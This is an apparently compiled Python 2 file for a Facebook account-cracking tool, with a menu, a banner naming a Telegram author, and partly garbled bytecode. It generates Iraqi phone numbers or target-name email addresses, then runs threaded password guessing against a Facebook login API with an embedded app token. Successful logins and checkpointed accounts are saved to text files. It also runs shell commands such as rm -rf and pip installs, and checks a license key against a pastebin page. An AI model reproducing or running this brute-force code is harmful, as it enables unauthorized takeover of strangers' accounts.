ó
ÿÿc           @   sC  e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z e j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qÍ We j d	  xJ e d
  D]< Z e j d d  Z e d d  e _ e GHe j j   q'Wy d d l Z Wn e k
 re j d  n Xy d d l Z Wn e k
 rÈe j d  n Xy d d l Z Wn8 e k
 re j d  e j d  e j d  n Xd d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m Z e  e  e j! d  e j   Z" e" j# e   e" j$ e j% j&   d d d0 g e" _' d1 g e" _' d   Z( d   Z) d   Z* d   Z+ d    Z, d!   Z- d" Z. d  Z/ g  Z0 g  Z1 g  Z2 g  Z3 g  Z4 g  Z5 g  Z6 d#   Z7 d$   Z8 d%   Z9 d&   Z: d'   Z; d(   Z< d)   Z= d*   Z> d+   Z? d,   Z@ eA d- k r?e j d.  e. GHe j d/  e@   n  d S(2   i    iÿÿÿÿNs   rm -rf .txti  iGô i s   .txtt   as   rm -rf ..txtiÄ	  i   iç  s   ..txts   pip2 install tqdms   pip2 install requestss   pip2 install mechanizei   s   python2 main.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g©?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   204989088o.pyt   mengetik1   s    c           C   s   d GHt  j j   d  S(   Nt   Keluar(   t   osR   t   exit(    (    (    s   204989088o.pyt   keluar8   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   204989088o.pyt   acak=   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   R   R   (   R   R   R   t   jR   (    (    s   204989088o.pyR   F   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
gü©ñÒMbP?(   R   R   R   R	   R
   R   (   R   R   (    (    s   204989088o.pyt   jalanQ   s    c          C   sY   t  d d d d d d  8 }  x. t d  D]  } t j d  |  j d  q+ WWd  QXd  S(	   Nt   totalid   t   descs   Loading t
   bar_formats   {l_bar}{bar}g¸ëQ¸?i   (   t   tqdmt   rangeR
   R   t   update(   t   pbarR   (    (    s   204989088o.pyt   loadY   s    ss  
[1;97m    |     ____      |                '||    ||'     |     '||''|.    ..|'''.|  
[1;97m   |||    `  ||    |||      ....      |||  |||     |||     ||   ||  .|'     '  
[1;97m  |  ||      /,   |  ||   .|...||     |'|..'||    |  ||    ||''|'   ||    .... 
[1;97m .''''|.    //   .''''|.  ||          | '|' ||   .''''|.   ||   |.  '|.    ||  
[1;97m.|.  .||.  ((   .|.  .||.  '|...'    .|. | .||. .|.  .||. .||.  '|'  ''|...'|  
[1;97m           ||                                                                  
[1;97m           |' 

[1;97mMy Telegram : [1;97m@A7Ae_MARG

[1;97mMy Chanell : [1;97m@A7AeMARG
    c           C   s5   t  j d  t GHd GHd GHd GHd d GHt   d  S(   Nt   clears-   [1;97m[[1;97m1[1;97m][1;97m CRACK NUMBERSs+   [1;97m[[1;97m2[1;97m][1;97m CRACK emails1   [1;97m[[1;97m0[1;97m][1;97m Exit this programi2   s   [1;97m~(   R   t   systemt   logot
   pilih_menu(    (    (    s   204989088o.pyt   menuu   s    	c          C   sª   t  d  }  |  d k r' d GHt   n |  d k s? |  d k rI t   n] |  d k sa |  d k rx t   t j d  n. |  d k s |  d k r t   n d GHt   d  S(	   Ns@   [1;97m[[97mâ¢[1;97m] [1;97m( [1;97mChoose[1;97m ) > [97mR   s-   [1;97m[[1;97m![1;97m][1;97m Wrong input !t   1t   2s   python2 un.pyt   0s'   [1;97m[[1;97mÃ·[1;97m] Wrong input !(   t	   raw_inputR0   t   crack_nomort   crack_emailR   R.   R   (   t   unikers(    (    s   204989088o.pyR0      s    


c           C   s:   t  j d  t GHd GHd GHd GHd GHd d GHt   d  S(   NR-   s7   [1;97m[[1;97m1[1;97m][1;97m CRACK NUMBERS KURDSTAN s7   [1;97m[[1;97m2[1;97m][1;97m CRACK NUMBERS PASWORDS s9   [1;97m[[1;97m3[1;97m][1;97m CRACK NUMBERS Free Mod   s6   [1;97m[[1;71m0[1;97m][1;97m Back To Menu          i2   s   [1;97m~(   R   R.   R/   t   pilih(    (    (    s   204989088o.pyR6      s    	c          C   sá   t  d  }  |  d k r' d GHt   n¶ |  d k s? |  d k rI t   n |  d k sa |  d k rk t   nr |  d k s |  d k r t   nP |  d k s¥ |  d k r¯ t   n. |  d k sÇ |  d k rÑ t   n d	 GHt   d  S(
   NsB   [1;97m[[97mâ¢[1;97m] [1;97m( [1;97mChoose[1;97m ) > [1;97mR   s-   [1;97m[[1;97mx[1;97m][1;97m Wrong input !R2   R3   t   3t   4R4   s'   [1;97m[[1;97mÃ·[1;97m] Wrong input !(   R5   R9   t   indiat   nguyent   a7aR7   R1   (   R8   (    (    s   204989088o.pyR9      s     





c             sÌ  t  j d  t GHd GHd d GHyq t d    t    d k  rM t d  n d d	  d
 }  x0 t |  d  j   D] } t j	 | j
    qs WWn' t k
 rº d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qWd GH   f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d  t  j d  d  S(    NR-   s%   [1;97m       750-751-770-771-780-781i2   s   [1;97m~s@   [1;97m[[1;97mâ¢[1;97m][1;97m Choose Number [1;97m :[1;97mi   s5   [1;97m[[1;97m![1;97m][1;97m Kode Wajib 3 Digit !!R   s   +964s   .txtt   rs   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;97mâ¢[1;97m][1;97m Total Number [1;97m:[1;97m g      à?s+   [1;92m[[1;92m![1;92m] [1;92mDon't closes   .   s   ..  s   ... s1   [1;92m[[1;92mâ¢[1;92m][1;92m Crack Running i   s;   [1;97m
~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n Xy`| } t j d    | d | d  } t j |  } d | k rá d    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n©d | d k r\d    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n.d } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n, d | d k r;d    | d | GHn  t d d	  } | j d    | d | d  | j	   t j | |  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   save/india.txtR    s   [Berhasil] s    | s   
s   www.facebook.comt	   error_msgs#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m s   [Cekpoint] t
   1122334455(   R   t   mkdirt   OSErrort   urllibt   urlopent   jsonR,   t   openR   t   closet   okst   appendt   cekpoint(   t   argt   usert   pass1t   dataR   t   okbt   cpst   pass2(   t   ct   k(    s   204989088o.pyt   mainÎ   sL    '%
%
'%
%
i<   s6   [1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msD   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/bangla1.txts   [1;97m[[1;97m BACK [1;97m]s   python2 un.py(   R   R.   R/   R5   R   R   RI   t	   readlinest   idRL   t   stript   IOErrorR1   R"   R$   R
   R   R   R   R	   R   t   mapRK   RM   (   t   idlistt   linet   xxxt   titikt   oRW   t   p(    (   RU   RV   s   204989088o.pyR<   ¯   sH    	"

*)
c             sÑ  t  j d  t GHd GHd GHd d GHyq t d    t    d k  rR t d  n d	 d
  d }  x0 t |  d  j   D] } t j	 | j
    qx WWn' t k
 r¿ d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qWd GH   f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d  t  j d   d  S(!   NR-   s%   [1;97m       crack numbers free mod s%   [1;97m       750-751-770-771-780-781i2   s   [1;97m~s@   [1;97m[[1;97mâ¢[1;97m][1;97m Choose Number [1;97m :[1;97mi   s5   [1;97m[[1;97m![1;97m][1;97m Kode Wajib 3 Digit !!R   s   +964s   .txtR?   s   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;97mâ¢[1;97m][1;97m Total Number [1;97m:[1;97m g      à?s+   [1;92m[[1;92m![1;92m] [1;92mDon't closes   .   s   ..  s   ... s1   [1;92m[[1;92mâ¢[1;92m][1;92m Crack Running i   s;   [1;97m
~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n Xy`| } t j d    | d | d  } t j |  } d | k rá d    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n©d | d k r\d    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n.d } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j d
    | d | d  | j	   t
 j | |  n{ d | d k rd    | d | GHt d d	  } | j d    | d | d  | j	   t j | |  n  Wn n Xd  S(   NR@   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RA   s#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   save/india.txtR    s   [Berhasil] s    | s   
s   mbasic.facebook.comRB   s#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m s   [Cekpoint] RC   (   R   RD   RE   RF   RG   RH   R,   RI   R   RJ   RK   RL   RM   (   RN   RO   RP   RQ   R   RR   RS   RT   (   RU   RV   (    s   204989088o.pyRW   #  sL    '%
%
'%
%
i<   s6   [1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msD   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/bangla1.txts   [1;97m[[1;97m BACK [1;97m]s   python2 un.py(   R   R.   R/   R5   R   R   RI   RX   RY   RL   RZ   R[   R1   R"   R$   R
   R   R   R   R	   R   R\   RK   RM   (   R]   R^   R_   R`   Ra   RW   Rb   (    (   RU   RV   s   204989088o.pyR>     sJ    	"

*)
c             s  t  j d  t GHd GHd d GHy² t d    t    d k  rM t d  n d d	  d
 GHt d   t d   t d   t d   t d   d }  x0 t |  d  j   D] } t j	 | j
    q´ WWn' t k
 rû d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qVWd GH        f d   } t d  } | j | t  d GHd  GHd! t t t   d" t t t   GHd# GHd GHt d$  t  j d%  d  S(&   NR-   s!   [1;97m   750-751-770-771-780-781i2   s   [1;97m~sA   [1;97m[[1;97mâ¢[1;97m][1;97m Choose Number [1;97m :[1;97m i   s5   [1;97m[[1;97m![1;97m][1;97m Kode Wajib 3 Digit !!R   s   +964sB   [1;97m[[1;97mâ¢[1;97m] [1;97m Example : [1;91m ( A7Ae MARG) s+   [1;97m[[97mâ¢[1;97m] Password 1 : [97ms2   [1;97m[[97mâ¢[1;97m] [1;97mPassword 2 : [97ms+   [1;97m[[97mâ¢[1;97m] Password 3 : [97ms2   [1;97m[[97mâ¢[1;97m] [1;97mPassword 4 : [97ms+   [1;97m[[97mâ¢[1;97m] Password 5 : [97ms   .txtR?   s   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;97mâ¢[1;97m][1;97m Total Number [1;97m:[1;97m g      à?s+   [1;97m[[1;97m![1;97m] [1;97mDon't Closes   .   s   ..  s   ... s1   [1;97m[[1;97mâ¢[1;97m][1;97m Crack Running i   s<   [1;97m
~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n XyÌt j d    | d  d  } t j |  } d | k rÛ d    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nd | d k rVd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n t j d    | d  d  } t j |  } d | k rd    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nód | d k r~d    | d  GHt d d	  } | j d    | d  d  | j	   t j |   nxt j d    | d  d  } t j |  } d | k r+d    | d  GHt d d	  } | j d
    | d  d  | j	   t
 j |   nËd | d k r¦d    | d  GHt d d	  } | j d    | d  d  | j	   t j |   nPt j d    | d  d  } t j |  } d | k rSd    | d  GHt d d	  } | j d    | d  d  | j	   t
 j |   n£d | d k rÎd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n(t j d    | d  d  } t j |  } d | k r{d    | d  GHt d d	  } | j d    | d  d  | j	   t
 j |   n{ d | d k röd    | d  GHt d d	  } | j d    | d  d  | j	   t j |   n  Wn n Xd  S(   NR@   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RA   s#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   save/nguyen.txtR    s   [HACK] s    | s   
s   www.facebook.comRB   s#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m s   [Cekpoint] s   [CHECK] s   [CHECK]s   [HACK]s   [CHECK(   R   RD   RE   RF   RG   RH   R,   RI   R   RJ   RK   RL   RM   (   RN   RO   RQ   R   RR   RS   (   RU   RV   RP   RT   t   pass3t   pass4t   pass5(    s   204989088o.pyRW   |  s    '%
%
'%
%
'%
%
'%
%
'%
%
i<   s6   [1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack Done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msC   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/nguyen.txts   [1;97m[[1;97m BACK [1;97m]s   python2 un.py(   R   R.   R/   R5   R   R   RI   RX   RY   RL   RZ   R[   R1   R"   R$   R
   R   R   R   R	   R   R\   RK   RM   (   R]   R^   R_   R`   Ra   RW   Rb   (    (   RU   RV   RP   RT   Rc   Rd   Re   s   204989088o.pyR=   W  sT    	"

!U)
c             sü  t  j d  t GHy  d GHt d    d GHt d   d GHt d   t d   t d	   t d
   t d   d }  x0 t |  d  j   D] } t j | j    q WWn' t	 k
 rÛ d GHt d  t
   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  q6Wd GH        f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d  t  j d   d  S(!   NR-   sD   [1;97m[[1;97mâ¢[1;97m][1;97m Example[1;97m :[1;97m putri.ayu s>   [1;97m[[1;97mâ¢[1;97m][1;97m Nama Target[1;97m :[1;97m sF   [1;97m[[1;97mâ¢[1;97m][1;97m Example [1;97m: [1;97m@hotmail.coms?   [1;97m[[1;97mâ¢[1;97m][1;97m Domain Email[1;97m :[1;97m sB   [1;97m[[1;97mâ¢[1;97m][1;97m Example [1;97m: [1;97mPutri123s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password1[1;97m :[1;97m s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password2[1;97m :[1;97m s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password3[1;97m :[1;97m s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password4[1;97m :[1;97m s<   [1;97m[[1;97mâ¢[1;97m][1;97m Password5[1;97m :[1;97m s   ..txtR?   s   [!] File Not Founds   
[ Kembali ]s>   [1;97m[[1;97mâ¢[1;97m][1;97m Total Email [1;97m:[1;97m i   s+   [1;97m[[1;97m![1;97m] [1;97mDon't Closes   .   s   ..  s   ... s1   [1;97m[[1;97mâ¢[1;97m][1;97m Crack Running s?   [1;97m
~~~~~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~~~~~c            s  |  } y t  j d  Wn t k
 r* n XyÍt j d   |  d  d  } t j |  } d | k rÛ d   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nd | d k rVd   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   n¡t j d   |  d  d  } t j |  } d | k rd   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nôd | d k r~d   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   nyt j d   |  d  d  } t j |  } d | k r+d   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   nÌd | d k r¦d   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   nQt j d   |  d  d  } t j |  } d | k rSd   |  d  GHt d d	  } | j d
   |  d  d  | j	   t
 j |   n¤d | d k rÎd   |  d  GHt d d	  } | j d   |  d  d  | j	   t j |   n)t j d   |  d  d  } t j |  } d | k r{d   |  d  GHt d d	  } | j d   |  d  d  | j	   t
 j |   n| d | d k r÷d   |  d  GH| j d d	  | j d   |  d  d  | j	   t j |   n  Wn n Xd  S(   NR@   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RA   s#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   save/email.txtR    s   [Berhasil] s    | s   
s   www.facebook.comRB   s#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m s   [Cekpoint] s   [1;97m s
   [Berhasil]s
   [Cekpoint](   R   RD   RE   RF   RG   RH   R,   RI   R   RJ   RK   RL   RM   (   RN   RO   RQ   R   RR   RS   (   RU   RV   RP   RT   Rc   Rd   Re   (    s   204989088o.pyRW      s    '%
%
'%
%
'%
%
'%
%
'%
%
i<   s6   [1;97m~~~~~~~~~~~~~~~~~~~A7Ae MARG~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack Done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msB   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/email.txts   [1;97m[[1;97m BACK [1;97m]s   python2 un.py(   R   R.   R/   R5   RI   RX   RY   RL   RZ   R[   R1   R"   R   R$   R
   R   R   R   R	   R   R\   RK   RM   (   R]   R^   R_   R`   Ra   RW   Rb   (    (   RU   RV   RP   RT   Rc   Rd   Re   s   204989088o.pyR7   Ü  sR    

!U)
c          C   si   t  j d  }  t j |  j  } | d } t j d  t d d  } | j |  | j	   t
   d  S(   Ns   https://httpbin.org/uuidt   uuids$   touch /data/data/com.termux/beta.txts   /data/data/com.termux/beta.txtR   (   t   requestst   getRH   t   loadst   textR   R.   RI   R   RJ   t   chk(   Rf   t   jsonidt   idjscrt   reb(    (    s   204989088o.pyt   idcr_  s    

c          C   sÊ   t  j d  }  d |  k r¿ t  j d  t d d  j   } d t |  GHt j d  j } | | k r d GHt	 j
 d	  t  j d
  t   qÆ t  j d
  d GHt	 j
 d	  t j   n t   d  S(   Ns   /data/data/com.termux/s   beta.txts(   chmod 777 /data/data/com.termux/beta.txts   /data/data/com.termux/beta.txtR?   s
   Your ID : s!   https://pastebin.com/raw/FWb1V8GHs   [1;92mYour ID is Active  .... i   s(   chmod 000 /data/data/com.termux/beta.txts!   [31;1mYour ID Isn't Active .....(   R   t   listdirR.   RI   t   readR"   Rg   Rh   Rj   R
   R   R1   R   R   Ro   (   R   t   readidt
   textupload(    (    s   204989088o.pyRk   j  s     
t   __main__R-   i   (   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](B   t   Falset   foot   barR   R   R
   t   datetimeR   t   hashlibt   ret	   threadingRH   RF   t	   cookielibt   getpassR.   R)   t   nR   t   nmbrRI   R   R	   Rg   t   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingt   brt   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R$   R,   R/   t   backt   berhasilRM   RK   RR   RY   t   cpbRS   R1   R0   R6   R9   R<   R>   R=   R7   Ro   Rk   t   __name__(    (    (    s   204989088o.pyt   <module>   s   

								
				T	T				